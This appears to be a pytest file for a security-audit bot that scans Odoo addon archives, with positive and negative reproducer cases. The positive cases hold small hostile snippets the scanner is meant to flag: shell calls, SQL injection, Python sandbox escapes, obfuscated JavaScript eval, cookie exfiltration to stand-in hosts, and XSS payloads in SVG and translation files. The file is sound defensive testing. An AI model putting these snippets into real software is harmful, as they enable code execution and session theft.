# ruff: noqa: E501 - reproducer strings are kept verbatim on one line
"""BOT-CODE-AUDIT-3: one positive and one negative per REVIEW-CODE-AUDIT-2 reproducer."""

from __future__ import annotations

import io
import zipfile

import pytest

from app.bots import code_audit as ca

MAN = b"{'name':'x','version':'17.0.1.0.0','depends':['base'],'license':'LGPL-3'}"
H = "import os\nfrom odoo import models, http\nfrom odoo.http import request\n"
M = H + "class A(models.Model):\n    _name = 'a.a'\n\n    def f(self, n):\n"
C = H + "class C(http.Controller):\n    @http.route('/a')\n    def a(self, u, **kw):\n"


def audit(files):
    b = io.BytesIO()
    with zipfile.ZipFile(b, "w") as z:
        z.writestr("x/__manifest__.py", MAN)
        z.writestr("x/__init__.py", b"")
        for k, v in files.items():
            z.writestr("x/" + k, v if isinstance(v, bytes) else v.encode())
    r = ca.audit(b.getvalue(), version=17)
    assert r.ok, r.error
    return {(f.code, f.severity) for f in r.findings if f.file in files}


def xml(body):
    return audit({"views/v.xml": f"<odoo>\n{body}\n</odoo>\n"})


def tmpl(body):
    return xml(f"<template id='t'>\n{body}\n</template>")


def js(src, name="static/src/a.js"):
    return audit({name: src})


SRV = "<record id='s' model='ir.actions.server'><field name='name'>s</field><field name='code'>{}</field></record>"
CRON = "<record id='c' model='ir.cron'><field name='name'>c</field><field name='code'>{}</field></record>"

POS = [
    ("H1-server", lambda: xml(SRV.format("os.system('id')")), "dangerous-call", "high"),
    ("H1-import", lambda: xml(SRV.format("import subprocess")), "server-code-import", "high"),
    (
        "H1-cron",
        lambda: xml(CRON.format("env.cr.execute('DELETE FROM x WHERE a=' + n)")),
        "sql-injection",
        None,
    ),
    (
        "H2-function",
        lambda: xml("<function model='res.users' name='write'><value eval='[1]'/></function>"),
        "xml-function-call",
        "high",
    ),
    (
        "H2-delete",
        lambda: xml("<delete model='res.groups' id='base.group_user'/>"),
        "xml-delete",
        "high",
    ),
    (
        "H3-globals",
        lambda: audit({"models/a.py": H + "globals()['__builtins__']['exec']('1')\n"}),
        None,
        "high",
    ),
    (
        "H3-vars",
        lambda: audit({"models/a.py": H + "f = vars(os)['system']\nf('id')\n"}),
        None,
        "high",
    ),
    (
        "H3-subclasses",
        lambda: audit({"models/a.py": H + "().__class__.__base__.__subclasses__()\n"}),
        None,
        "high",
    ),
    (
        "H4-list",
        lambda: audit({"models/a.py": H + "fs = [os.system]\nfs[0]('id')\n"}),
        None,
        "high",
    ),
    (
        "H4-dict",
        lambda: audit({"models/a.py": H + "d = {'a': os.system}\nd['a']('id')\n"}),
        None,
        "high",
    ),
    (
        "H5-sudo-alias",
        lambda: audit(
            {
                "models/a.py": M
                + "        s = self.sudo\n        s().env['res.users'].search([]).write({'active': 1})\n"
            }
        ),
        "sensitive-model-write",
        "high",
    ),
    (
        "H5-with-user",
        lambda: audit(
            {"models/a.py": M + "        self.with_user(1).env['res.groups'].create({})\n"}
        ),
        "sensitive-model-write",
        "high",
    ),
    (
        "H6-method-alias",
        lambda: audit(
            {"models/a.py": M + "        ex = self._cr.execute\n        ex('SELECT ' + n)\n"}
        ),
        "sql-injection",
        None,
    ),
    ("H7-indirect-eval", lambda: js("(0, eval)(x);\n"), "js-eval", "high"),
    ("H7-ctor-chain", lambda: js("[].constructor.constructor(x)();\n"), "js-eval", "high"),
    ("H7-computed", lambda: js("window['ev' + 'al'](x);\n"), "js-eval", "high"),
    (
        "H8-script-src",
        lambda: js("const s = document.createElement('script');\ns.src = u;\n"),
        "js-script-load",
        None,
    ),
    ("H8-loadjs", lambda: js("loadJS(u);\n"), "js-script-load", None),
    (
        "H8-image-cookie",
        lambda: js("new Image().src = 'https://e.x/?' + document.cookie;\n"),
        "js-cookie-leak",
        None,
    ),
    (
        "H8-fetch-cookie",
        lambda: js("fetch('https://e.x', {body: document.cookie});\n"),
        "js-cookie-leak",
        None,
    ),
    (
        "H9-svg",
        lambda: audit({"static/img/a.svg": "<svg onload='alert(1)'/>"}),
        "markup-inline-handler",
        None,
    ),
    (
        "H9-html",
        lambda: audit({"static/a.html": "<html><script>eval(x)</script></html>"}),
        "js-eval",
        "high",
    ),
    (
        "M1-fragment",
        lambda: js("document.createRange().createContextualFragment(x);\n"),
        None,
        None,
    ),
    ("M1-domparser", lambda: js("new DOMParser().parseFromString(x, 'text/html');\n"), None, None),
    ("M1-jquery", lambda: js("$(el).html(x);\n"), None, None),
    ("M1-computed", lambda: js("el['inner' + 'HTML'] = x;\n"), None, None),
    (
        "M2-onclick",
        lambda: tmpl("<a t-attf-onclick='go({{v}})'>x</a>"),
        "qweb-inline-handler",
        "high",
    ),
    ("M2-literal", lambda: tmpl("<a onclick='go()'>x</a>"), "qweb-inline-handler", "medium"),
    ("M3-href", lambda: tmpl("<a t-att-href='v'>x</a>"), "qweb-dynamic-url", "low"),
    ("M3-srcdoc", lambda: tmpl("<iframe t-att-srcdoc='v'/>"), "qweb-srcdoc", None),
    (
        "M3-form",
        lambda: tmpl("<form action='https://evil.example/x'/>"),
        "qweb-external-form",
        None,
    ),
    (
        "M3-refresh",
        lambda: tmpl("<meta http-equiv='refresh' content='0;url=https://e.x'/>"),
        "qweb-meta-refresh",
        None,
    ),
    (
        "M4-script",
        lambda: tmpl("<script>\nvar a = <t t-out='v'/>;\n</script>"),
        "qweb-script-injection",
        "medium",
    ),
    ("M5-style", lambda: tmpl("<style>@import url(https://e.x/a.css);</style>"), None, None),
    (
        "M6-markup-alias",
        lambda: audit(
            {
                "models/a.py": H
                + "from markupsafe import Markup as Mk\n\ndef f(x):\n    return Mk(x)\n"
            }
        ),
        None,
        None,
    ),
    (
        "M7-image-set",
        lambda: js("a { background: image-set(url(https://e.x/a.png) 1x); }\n", "static/a.css"),
        None,
        None,
    ),
    (
        "M7-attr",
        lambda: js("input[value^='a'] { background: url(/x?a); }\n", "static/a.css"),
        "css-exfiltration",
        "medium",
    ),
    (
        "M9-tar",
        lambda: audit(
            {
                "models/a.py": H
                + "import tarfile\n\ndef f(x):\n    tarfile.open(x).extractall('/tmp/a')\n"
            }
        ),
        "archive-extract",
        "medium",
    ),
    ("L2-utf16", lambda: js("eval(x);\n".encode("utf-16")), "js-eval", "high"),
    (
        "L3-safe-eval",
        lambda: audit(
            {
                "controllers/a.py": C.replace(
                    "import os", "from odoo.tools.safe_eval import safe_eval"
                )
                + "        return safe_eval(kw['c'])\n"
            }
        ),
        None,
        None,
    ),
    ("L4-location", lambda: js("window.location = x;\n"), "js-open-redirect", None),
    (
        "L5-po",
        lambda: audit({"i18n/fr.po": 'msgid "Save"\nmsgstr "<img src=x onerror=alert(1)>"\n'}),
        "po-markup-injection",
        "high",
    ),
    ("L6-oversized", lambda: audit({"static/src/b.js": "x" * 3_000_000}), "file-unaudited", "high"),
    (
        "F-cross-file",
        lambda: audit(
            {
                "controllers/a.py": C.replace("import os", "from ..models.h import red")
                + "        return red(u)\n",
                "models/h.py": "from odoo.http import request\n\ndef red(x):\n    return request.make_response(x)\n",
            }
        ),
        "tainted-response",
        None,
    ),
    (
        "F-getattr-dynamic",
        lambda: audit({"models/a.py": M + "        getattr(self, n)()\n"}),
        "dynamic-dispatch",
        "info",
    ),
    ("F-jsx", lambda: js("eval(x);\n", "static/src/a.jsx"), "js-eval", "high"),
]


@pytest.mark.parametrize("name,run,code,sev", POS, ids=[p[0] for p in POS])
def test_reproducer_flagged(name, run, code, sev):
    got = run()
    hits = {s for c, s in got if code is None or c == code}
    assert hits, got
    if sev == "info":
        assert "info" in hits, got
    elif sev:
        assert sev in hits, got
    else:
        assert hits & {"high", "medium", "low"}, got


NEG = [
    ("H1-server-ok", lambda: xml(SRV.format("records.write({'name': 'x'})"))),
    ("H2-function-ok", lambda: xml("<function model='x.y' name='_init_data'/>")),
    ("H2-delete-ok", lambda: xml("<delete model='x.y' id='x.rec'/>")),
    ("H3-ok", lambda: audit({"models/a.py": H + "d = {'a': 1}\nprint(d['a'], len(globals()))\n"})),
    ("H4-ok", lambda: audit({"models/a.py": H + "fs = [len]\nfs[0]('id')\n"})),
    ("H5-ok", lambda: audit({"models/a.py": M + "        self.env['res.partner'].create({})\n"})),
    (
        "H6-ok",
        lambda: audit(
            {"models/a.py": M + "        ex = self._cr.execute\n        ex('SELECT 1')\n"}
        ),
    ),
    ("H7-ok", lambda: js("const o = {eval: 1};\nconsole.log(o.eval, [].constructor);\n")),
    (
        "H8-ok",
        lambda: js(
            "const d = document.createElement('div');\nfetch('/web/x');\nnew Image().src = '/a.png';\n"
        ),
    ),
    ("H9-svg-ok", lambda: audit({"static/img/a.svg": "<svg><rect width='1'/></svg>"})),
    ("H9-html-ok", lambda: audit({"static/a.html": "<html><body><p>x</p></body></html>"})),
    ("M1-ok", lambda: js("$(el).text(x);\nel.textContent = x;\n")),
    ("M2-ok", lambda: tmpl("<a t-on-click='go'>x</a>")),
    ("M3-ok", lambda: tmpl("<a href='/web'>x</a><form action='/web/login'/>")),
    ("M5-ok", lambda: tmpl("<style>.a { color: red; }</style>")),
    (
        "M6-ok",
        lambda: audit(
            {
                "models/a.py": H
                + "from markupsafe import Markup as Mk\n\ndef f():\n    return Mk('<b>')\n"
            }
        ),
    ),
    ("M7-ok", lambda: js("input[type='text'] { color: red; }\n", "static/a.css")),
    (
        "M9-ok",
        lambda: audit(
            {
                "models/a.py": H
                + "import tarfile\n\ndef f(x):\n    tarfile.open(x).extractall('/t', filter='data')\n"
            }
        ),
    ),
    (
        "L1-xml",
        lambda: audit(
            {
                "views/v.xml": "<?xml version='1.0' encoding='latin-1'?>\n<odoo><data/></odoo>\n".encode(
                    "latin-1"
                )
            }
        ),
    ),
    (
        "L1-py",
        lambda: audit(
            {"models/a.py": "# -*- coding: latin-1 -*-\nx = 'caf\xe9'\n".encode("latin-1")}
        ),
    ),
    ("L4-ok", lambda: js("window.location = '/web';\n")),
    ("L5-ok", lambda: audit({"i18n/fr.po": 'msgid "<b>Save</b>"\nmsgstr "<b>Enregistrer</b>"\n'})),
    ("F-dts", lambda: js("declare const a: number;\n", "static/src/a.d.ts")),
    (
        "F-getattr-record",
        lambda: audit(
            {"models/a.py": M + "        return getattr(self, '_compute_%s' % self.name)()\n"}
        ),
    ),
]


@pytest.mark.parametrize("name,run", NEG, ids=[n[0] for n in NEG])
def test_reproducer_negative(name, run):
    got = run()
    # access-missing is the unrelated model-level ACL check for the probe model
    assert not {c for c, s in got if s in ("high", "medium") and c != "access-missing"}, got


def test_stock_noise_negatives():
    """Stock Odoo shapes seen in the noise run: no HIGH/MEDIUM."""
    css = "[data-mimetype^='image'] { background: url(/web/static/img/i.svg); }\n"
    css += ".a[type='x'] { background: url(data:image/svg+xml,abc); }\n"
    got = js(css, "static/a.scss")
    assert not {c for c, s in got if s in ("high", "medium")}, got
    py = (
        H
        + "import importlib.metadata\nimport importlib.util\n\nv = importlib.metadata.version('x')\nimportlib.util.find_spec('x')\n"
    )
    got = audit({"models/a.py": py})
    assert not {c for c, s in got if s in ("high", "medium")}, got
    got = audit({"models/a.py": H + "import importlib\nimportlib.import_module(os.environ['M'])\n"})
    assert ("dangerous-call", "high") in got
